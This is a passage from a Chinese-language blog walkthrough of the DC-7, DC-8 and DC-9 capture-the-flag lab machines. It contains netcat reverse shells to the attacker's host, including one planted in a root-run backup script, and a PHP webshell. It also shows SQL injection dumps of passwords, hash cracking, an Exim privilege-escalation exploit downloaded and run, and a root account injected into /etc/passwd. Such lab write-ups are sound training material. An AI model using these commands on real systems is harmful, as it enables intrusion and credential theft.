class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2222</span> <span class="comment">#这是后来我加上去的，反弹shell</span></span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2222</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意这里有一个drush命令，是用来管理drupal站点的shell，这里可以修改下密码</span></span><br><span class="line"><span class="comment">#注意需要切换到此目录下才可以成功执行</span></span><br><span class="line">dc7user@dc<span class="literal">-7</span>:/opt/scripts<span class="variable">$</span> cd /var/www/html</span><br><span class="line">cd /var/www/html</span><br><span class="line">dc7user@dc<span class="literal">-7</span>:/var/www/html<span class="variable">$</span> drush user<span class="literal">-password</span> admin -<span class="literal">-password</span>=<span class="string">"chj"</span></span><br><span class="line">drush user<span class="literal">-password</span> admin -<span class="literal">-password</span>=<span class="string">"chj"</span></span><br><span class="line">Changed password <span class="keyword">for</span> admin                                           [<span class="type">success</span>]</span><br></pre></td></tr></table></figure>

<p><strong>进入后台以后，需要先安装下php fiter 以便后续反弹shell，drupal 7 是自带的，8版本删去了 ，在extend下，先导入</strong></p>
<p><strong><a href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz" target="_blank" rel="noopener">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</a> 下的安装包，然后下拉找到php fiter 点击再安装。</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/9.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/8.png" alt></p>
<p><strong>然后在add content 下 add basic page ，然后写入webshell  本地监听，反弹shell！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/10.png" alt></p>
<p><strong>连接成功以后，将反弹shell命令写入backups.sh中，再次反弹，得到root权限，查看flag！</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</span></span><br><span class="line"><span class="comment">#&lt;?php system('nc -e  /bin/bash 192.168.126.33 1234'?&gt;</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-7</span>:/opt/scripts<span class="variable">$</span> echo <span class="string">"nc -e /bin/bash 192.168.126.33 2222"</span> &gt;&gt; backups.sh</span><br><span class="line">python <span class="literal">-c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">root@dc<span class="literal">-7</span>:~<span class="comment"># pwd</span></span><br><span class="line">pwd</span><br><span class="line">/root</span><br><span class="line">root@dc<span class="literal">-7</span>:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">theflag.txt</span><br><span class="line">root@dc<span class="literal">-7</span>:~<span class="comment"># cat theflag.txt</span></span><br><span class="line">cat theflag.txt</span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P </span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span>  </span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I'm sending out an especially big thanks to:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@4nqr34z</span></span><br><span class="line"><span class="string">@D4mianWayne</span></span><br><span class="line"><span class="string">@0xmzfr</span></span><br><span class="line"><span class="string">@theart42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-8渗透过程"><a href="#DC-8渗透过程" class="headerlink" title="DC-8渗透过程"></a><strong>DC-8渗透过程</strong></h2><p> <strong>whatweb查看网站指纹信息，发现是drupal 7系统，和之前一样看看能否利用漏洞，发现不太行，不过发现网站存在sql注入漏洞，用sqlmap进行爆破，得到账号和密码，但是hash密码需要用john进行破解，需要特别久的时间才可以跑出来！</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">爆库、爆表、爆字段</span></span><br><span class="line">root@kali:~# sqlmap -u "http://192.168.126.158/?nid=1" --current-db</span><br><span class="line">current database: 'd7db'</span><br><span class="line">root@kali:~# sqlmap -u "http://192.168.126.158/?nid=1" -D d7db -T users --columns</span><br><span class="line">root@kali:~# sqlmap -u "http://192.168.126.158/?nid=1" -D d7db -T users -C name,pass --dump</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">rockyou密码本实在长，需要跑很久很久</span></span><br><span class="line">root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure>

<p><strong>一开始不太理解为什么选择这里插入，大概就是想办法在后台找到可以插入php语句，并且能够执行的地方，本地监听端口，成功反弹shell！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/11.jpg" alt></p>
<p><strong>寻找相关命令是否可以提权，发现了可疑的exim4，寻找相关exp发现了有许多漏洞，查看exim4的版本，这里选取46996.sh作为提权文件，正常情况下是得一个个试过去，这里就不尝试了，然后修改exp的换行符，再上传到靶机中去，需要注意的是，要给文件增加一个可执行权限，且只有在/tmp下才可以传输文件！</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python <span class="literal">-c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/var/www/html<span class="variable">$</span> find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span>  f  <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line"></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/var/www/html<span class="variable">$</span> /usr/sbin/exim4 -<span class="literal">-version</span></span><br><span class="line">Exim version <span class="number">4.89</span> </span><br><span class="line"></span><br><span class="line">root@kali:/var/www/html<span class="comment"># searchsploit exim</span></span><br><span class="line">Exim <span class="number">4.87</span> - <span class="number">4.91</span> - Local Privilege Escalation                                              | exploits/linux/local/<span class="number">46996</span>.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改换行符，因为在windows下执行过</span></span><br><span class="line">vi <span class="number">46996</span>.sh</span><br><span class="line">:%s/^M//g</span><br><span class="line">:wq</span><br><span class="line"></span><br><span class="line"><span class="comment">#主机开启python -m SimpleHTTPServer 9001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机下载脚本</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/tmp<span class="variable">$</span> wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>/<span class="number">46996</span>.sh</span><br><span class="line">wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>/<span class="number">46996</span>.sh</span><br><span class="line">-<span class="literal">-2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">00</span>:<span class="number">15</span>:<span class="number">09</span>--  http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>/<span class="number">46996</span>.sh</span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">3706</span> (<span class="number">3.6</span>K) [<span class="type">text</span>/<span class="type">x</span>-<span class="type">sh</span>]</span><br><span class="line">Saving to: <span class="string">'46996.sh'</span></span><br><span class="line"></span><br><span class="line"><span class="number">46996</span>.sh            <span class="number">100</span>%[===================&gt;]   <span class="number">3.62</span>K  --.<span class="literal">-KB</span>/s    <span class="keyword">in</span> <span class="number">0</span>s      </span><br><span class="line"></span><br><span class="line"><span class="number">2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">00</span>:<span class="number">15</span>:<span class="number">09</span> (<span class="number">23.1</span> MB/s) - <span class="string">'46996.sh'</span> saved [<span class="number">3706</span>/<span class="number">3706</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行脚本提权</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/tmp<span class="variable">$</span> ./run.sh <span class="literal">-m</span> netcat</span><br><span class="line">./run.sh <span class="literal">-m</span> netcat</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - <span class="string">"The Return of the WIZard"</span> LPE exploit</span><br><span class="line">Copyright (c) <span class="number">2019</span> Marco Ivaldi &lt;raptor@<span class="number">0</span>xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Delivering netcat payload...</span><br><span class="line"><span class="number">220</span> dc<span class="literal">-8</span> ESMTP Exim <span class="number">4.89</span> Sat, <span class="number">19</span> Sep <span class="number">2020</span> <span class="number">13</span>:<span class="number">29</span>:<span class="number">30</span> +<span class="number">1000</span></span><br><span class="line"><span class="number">250</span> dc<span class="literal">-8</span> Hello localhost.lan [::<span class="number">1</span>]</span><br><span class="line"><span class="number">250</span> OK</span><br><span class="line"><span class="number">250</span> Accepted</span><br><span class="line"><span class="number">354</span> Enter message, ending with <span class="string">"."</span> on a line by itself</span><br><span class="line"><span class="number">250</span> OK id=<span class="number">1</span>kJTZ4<span class="literal">-0000Or</span><span class="literal">-UC</span></span><br><span class="line"><span class="number">221</span> dc<span class="literal">-8</span> closing connection</span><br><span class="line"></span><br><span class="line">Waiting <span class="number">5</span> seconds...</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">localhost <span class="function">[<span class="number">127.0</span><span class="type">.0.1</span>] 31337 (?) <span class="title">open</span></span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">Brilliant - you have succeeded!!!</span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span></span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888</span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888</span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888</span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span></span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P</span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span></span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-9渗透过程"><a href="#DC-9渗透过程" class="headerlink" title="DC-9渗透过程"></a><strong>DC-9渗透过程</strong></h2><p><strong>进入首页，查看输入的地方，发现存在sql注入，burp抓包然后丢入sqlmap进行爆破，在user表下发现的用户密码没什么用，查看另一个表，发现了admin，密码是md5加密，可以用自带的密码本爆破出来</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat dc-9</span></span><br><span class="line">POST /results.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">126.159</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">68.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">68.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept<span class="literal">-Language</span>: en<span class="literal">-US</span>,en;q=<span class="number">0.5</span></span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">192.168</span>.<span class="number">126.159</span>/search.php</span><br><span class="line">Content<span class="literal">-Type</span>: application/x<span class="literal">-www</span><span class="literal">-form</span><span class="literal">-urlencoded</span></span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">8</span></span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=<span class="number">9</span>sb365ben06it8fk0hu3bngrc3</span><br><span class="line">Upgrade<span class="literal">-Insecure</span><span class="literal">-Requests</span>: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">search=<span class="number">1</span></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -dbs</span></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -D users -T UserDetails -C id,username,password --dump</span></span><br><span class="line">Database: users</span><br><span class="line">Table: UserDetails</span><br><span class="line">[<span class="number">17</span> <span class="type">entries</span>]</span><br><span class="line">+----+-----------+---------------+</span><br><span class="line">| id | username  | password      |   </span><br><span class="line">+----+-----------+---------------+</span><br><span class="line">| <span class="number">1</span>  | marym     | <span class="number">3</span>kfs86sfd     |</span><br><span class="line">| <span class="number">2</span>  | julied    | <span class="number">468</span>sfdfsd2    |</span><br><span class="line">| <span class="number">3</span>  | fredf     | <span class="number">4</span>sfd87sfd1    |</span><br><span class="line">| <span class="number">4</span>  | barneyr   | RocksOff      |</span><br><span class="line">| <span class="number">5</span>  | tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| <span class="number">6</span>  | jerrym    | B8m<span class="comment">#48sd      |</span></span><br><span class="line">| <span class="number">7</span>  | wilmaf    | Pebbles       |</span><br><span class="line">| <span class="number">8</span>  | bettyr    | BamBam01      |</span><br><span class="line">| <span class="number">9</span>  | chandlerb | UrAG0D!       |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -D Staff -T Users -C  Username,Password --dump</span></span><br><span class="line"><span class="keyword">do</span> you want to use common password suffixes? (slow!) [<span class="type">y</span>/<span class="type">N</span>] y</span><br><span class="line">[<span class="number">12</span>:<span class="number">06</span>:<span class="number">17</span>] [<span class="type">INFO</span>] starting dictionary<span class="literal">-based</span> cracking (md5_generic_passwd)</span><br><span class="line">[<span class="number">12</span>:<span class="number">06</span>:<span class="number">17</span>] [<span class="type">INFO</span>] starting <span class="number">4</span> processes </span><br><span class="line">[<span class="number">12</span>:<span class="number">06</span>:<span class="number">49</span>] [<span class="type">INFO</span>] <span class="keyword">using</span> suffix <span class="string">'1'</span>                                                                                       </span><br><span class="line">[<span class="number">12</span>:<span class="number">07</span>:<span class="number">16</span>] [<span class="type">INFO</span>] cracked password <span class="string">'transorbital1'</span> <span class="keyword">for</span> user <span class="string">'admin'</span>                                                                </span><br><span class="line">Database: Staff                                                                                                                    </span><br><span class="line">Table: Users</span><br><span class="line">[<span class="number">1</span> <span class="type">entry</span>]</span><br><span class="line">+----------+--------------------------------------------------+</span><br><span class="line">| Username | Password                                         |</span><br><span class="line">+----------+--------------------------------------------------+</span><br><span class="line">| admin    | <span class="number">856</span>f5de590ef37314e7c3bdf6f8a66dc (transorbital1) |</span><br><span class="line">+----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><strong>登陆后台，提示了文件不存在，可能存在文件包含漏洞。构造payload成功猜解出file关键词，但是和之前的不太一样，不能查看其它文件，没法写入，看了其它人的思路，后台存有/etc/knockd.conf文件，结合之前扫描出的22端口是关闭状态，knockd可以对SSH进行防护。这里意思是端口敲门，需要按照顺序‘敲’端口，如果敲击规则匹配，则可以让防火墙实时更改策略。从而达到开关防火墙的目的。</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/11.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/152.png" alt></p>
<p><strong>依次nc连接目标端口，22端口成功打开！然后利用之前爆破出的用户名和密码，进行ssh连接尝试，得到3个成功用户！</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:/var/www/html<span class="comment"># nmap -sV -p- -A 192.168.126.159</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https://nmap.org ) at <span class="number">2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">11</span>:<span class="number">37</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">126.159</span></span><br><span class="line">Host is up (<span class="number">0.00049</span>s latency).</span><br><span class="line">Not shown: <span class="number">65519</span> closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line"><span class="number">22</span>/tcp    filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp    open     http          Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nc 192.168.126.159 7469</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 7469 (?) : <span class="title">Connection</span></span> refused</span><br><span class="line">root@kali:~<span class="comment"># nc 192.168.126.159 8475</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 8475 (?) : <span class="title">Connection</span></span> refused</span><br><span class="line">root@kali:~<span class="comment"># nc 192.168.126.159 9842</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 9842 (?) : <span class="title">Connection</span></span> refused</span><br><span class="line">root@kali:~<span class="comment"># nmap -p 22 192.168.126.159</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https://nmap.org ) at <span class="number">2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">16</span>:<span class="number">59</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">126.159</span></span><br><span class="line">Host is up (<span class="number">0.00032</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">76</span>:F3:B2 (VMware)</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存在本地文件</span></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -D users -T UserDetails -C password --dump --output-dir /root/</span></span><br><span class="line">root@kali:~/<span class="number">192.168</span>.<span class="number">126.159</span>/dump/users<span class="comment"># hydra -L dc_user.txt -P pass_dc.txt ssh://192.168.126.159</span></span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.159</span>   login: chandlerb   password: UrAG0D!</span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.159</span>   login: joeyt   password: Passw0rd</span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.159</span>   login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>

<p><strong>分别登陆3个用户，查看有没有什么线索，最后在janitor用户下发现了隐藏文件，里面又是几个密码，加入之前的密码本进行爆破，得到了新用户fredf，密码为B4-Tru3-001。进去查看提权文件，发现test文件可以执行root权限，运行完发现是python编写的，但是打开又是乱码，于是查找test.py文件，果然发现了，查看代码，大概意思就是可以将一个文件写入到另一个文件上，可以利用此添加用户，加入到/etc/passwd中去！</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">janitor@dc<span class="literal">-9</span>:~<span class="variable">$</span> ls <span class="literal">-la</span></span><br><span class="line">total <span class="number">16</span></span><br><span class="line">drwx------  <span class="number">4</span> janitor janitor <span class="number">4096</span> Sep <span class="number">19</span> <span class="number">19</span>:<span class="number">15</span> .</span><br><span class="line">drwxr<span class="literal">-xr</span><span class="literal">-x</span> <span class="number">19</span> root    root    <span class="number">4096</span> Dec <span class="number">29</span>  <span class="number">2019</span> ..</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> janitor janitor    <span class="number">9</span> Dec <span class="number">29</span>  <span class="number">2019</span> .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  <span class="number">3</span> janitor janitor <span class="number">4096</span> Sep <span class="number">19</span> <span class="number">19</span>:<span class="number">15</span> .gnupg</span><br><span class="line">drwx------  <span class="number">2</span> janitor janitor <span class="number">4096</span> Dec <span class="number">29</span>  <span class="number">2019</span> .secrets<span class="literal">-for</span><span class="literal">-putin</span></span><br><span class="line">janitor@dc<span class="literal">-9</span>:~<span class="variable">$</span> cd .secrets<span class="literal">-for</span><span class="literal">-putin</span>/</span><br><span class="line">janitor@dc<span class="literal">-9</span>:~/.secrets<span class="literal">-for</span><span class="literal">-putin</span><span class="variable">$</span> ls</span><br><span class="line">passwords<span class="literal">-found</span><span class="literal">-on</span><span class="literal">-post</span><span class="literal">-it</span><span class="literal">-notes</span>.txt</span><br><span class="line">janitor@dc<span class="literal">-9</span>:~/.secrets<span class="literal">-for</span><span class="literal">-putin</span><span class="variable">$</span> cat passwords<span class="literal">-found</span><span class="literal">-on</span><span class="literal">-post</span><span class="literal">-it</span><span class="literal">-notes</span>.txt </span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic<span class="comment">#10-4</span></span><br><span class="line">B4<span class="literal">-Tru3</span><span class="literal">-001</span></span><br><span class="line"><span class="number">4</span>uGU5T<span class="literal">-NiGHts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找test.py</span></span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> find / <span class="literal">-name</span> test.py <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/opt/devstuff/test.py</span><br><span class="line">/usr/lib/python3/dist<span class="literal">-packages</span>/setuptools/command/test.py</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> cd /opt/devstuff/</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff<span class="variable">$</span> ls</span><br><span class="line">build  dist  __pycache__  test.py  test.spec</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff<span class="variable">$</span> cat test.py </span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">import sys</span><br><span class="line"><span class="keyword">if</span> len (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    print (<span class="string">"Usage: python test.py read append"</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[<span class="number">2</span>], <span class="string">"a"</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>

<p><strong>利用kail自带的openssl，进行加密，-1表示md5算法，-salt表示插入一个随机数作为加密内容</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> openssl passwd <span class="literal">-1</span> <span class="literal">-salt</span> test <span class="number">123456</span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$test</span><span class="variable">$at615QShYKduQlx5z9Zm7</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户名:密码:uid:gid:家目录:登陆后使用的shell</span></span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> echo <span class="string">'test:$1$test$at615QShYKduQlx5z9Zm7/:0:0::/root:/bin/bash'</span> &gt;&gt; /tmp/passwd</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> sudo ./test /tmp/passwd /etc/passwd</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> su test</span><br><span class="line">Password: </span><br><span class="line">root@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="comment"># cd /root</span></span><br><span class="line">  </span><br><span class="line">root@dc<span class="literal">-9</span>:~<span class="comment"># cat theflag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have done well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC<span class="literal">-9</span>.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an <span class="keyword">end</span>, and this will be the last ever</span><br><span class="line">challenge <span class="keyword">in</span> the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks <span class="keyword">for</span> all the fish.</span><br></pre></td></tr></table></figure>

<hr>
